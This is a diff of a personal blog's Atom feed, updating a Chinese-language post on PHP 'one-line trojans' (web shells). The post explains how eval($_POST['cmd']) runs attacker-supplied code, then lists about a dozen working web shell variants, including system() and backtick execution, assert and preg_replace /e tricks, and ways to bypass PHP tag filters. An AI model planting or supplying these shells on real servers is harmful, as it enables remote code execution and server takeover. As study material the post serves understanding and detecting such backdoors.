@@ -6,7 +6,7 @@
   <link href="https://sinevil.github.io/atom.xml" rel="self"/>
   
   <link href="https://sinevil.github.io/"/>
-  <updated>2021-07-19T11:38:18.055Z</updated>
+  <updated>2021-07-19T12:47:19.985Z</updated>
   <id>https://sinevil.github.io/</id>
   
   <author>
@@ -17,23 +17,23 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>yijuhua</title>
+    <title>一句话木马</title>
     <link href="https://sinevil.github.io/2021/07/19/yijuhua/"/>
     <id>https://sinevil.github.io/2021/07/19/yijuhua/</id>
     <published>2021-07-19T11:23:05.000Z</published>
-    <updated>2021-07-19T11:38:18.055Z</updated>
+    <updated>2021-07-19T12:47:19.985Z</updated>
     
-    <content type="html"><![CDATA[<ul><li>php一句话木马</li></ul><p><code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt; </code></p><blockquote><p>php代码写在<?php ?> 中是因为这样服务器才能识别其为php代码，然后进行解析</p><p><code>@</code>符号的作用是不报错</p><p>php eval()的作用：把字符串按照php代码来计算，此字符串必须是合法的php代码，且必须以分号结尾</p><p>如果没有在代码字符串中调用return语句，则返回null，如果代码解析错误，则eval()函数返回false</p></blockquote>]]></content>
+    <content type="html"><![CDATA[<p><strong>php一句话木马</strong></p><p><code> &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code> </p><ul><li>运行原理</li></ul><p>php代码写在<?php ?> 中是因为这样服务器才能识别其为php代码，然后进行解析</p><p><code>@</code>符号的作用是不报错</p><p>php eval()的作用：把字符串按照php代码来计算，此字符串必须是合法的php代码，且必须以分号结尾</p><p>如果没有在代码字符串中调用return语句，则返回null，如果代码解析错误，则eval()函数返回false</p><p>实际上就是用post方法接收<code>[]</code>中的变量，然后把变量里面的字符串当做php代码来执行</p><ul><li>其他的一句话木马</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST1</span>);?&gt;</span><br><span class="line">&lt;?php <span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);&#125;?&gt;</span><br><span class="line">&lt;?php system(<span class="variable">$_REQUEST1</span>);?&gt;</span><br><span class="line">&lt;?php (<span class="variable">$_</span>=@<span class="variable">$_GET1</span>).@<span class="variable">$_</span>(<span class="variable">$_POST1</span>)?&gt;</span><br><span class="line">&lt;?php eval_r(<span class="variable">$_POST1</span>)?&gt;</span><br><span class="line">&lt;?php @eval_r(<span class="variable">$_POST1</span>)?&gt;  <span class="comment">#容错代码</span></span><br><span class="line">&lt;?php assert(<span class="variable">$_POST1</span>);?&gt;  <span class="comment">#使用Lanker一句话客户端的专家模式执行相关的PHP语句</span></span><br><span class="line">&lt;?<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>]);?&gt;</span><br><span class="line">&lt;?<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>])?&gt;</span><br><span class="line">&lt;?php @preg_replace(<span class="string">&quot;/[email]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>],<span class="string">&quot;error&quot;</span>);?&gt;  <span class="comment">#使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt;</span></span><br><span class="line">&lt;?php <span class="built_in">echo</span> `<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]` ?&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@eval_r(<span class="variable">$_POST</span>[sb])&lt;/script&gt;  <span class="comment">#绕过&lt;?限制的一句话</span></span><br><span class="line">&lt;?=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);  <span class="comment">#绕过&lt;?php ?&gt;限制的一句话 </span></span><br></pre></td></tr></table></figure>]]></content>
     
     
       
       
-    <summary type="html">&lt;ul&gt;
-&lt;li&gt;php一句话木马&lt;/li&gt;
+    <summary type="html">&lt;p&gt;&lt;strong&gt;php一句话木马&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt; &amp;lt;?php @eval($_POST[&amp;#39;cmd&amp;#39;]);?&amp;gt;&lt;/code&gt; &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;运行原理&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;code&gt;&amp;lt;?php @eval($_POST[&amp;#39;cmd&amp;#39;]);?&amp;gt; &lt;/code&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;php代码写在&lt;?php ?&gt; 中是因为这样服务器才能识别其</summary>
+&lt;p&gt;php代码写在&lt;?php </summary>
       
     
     
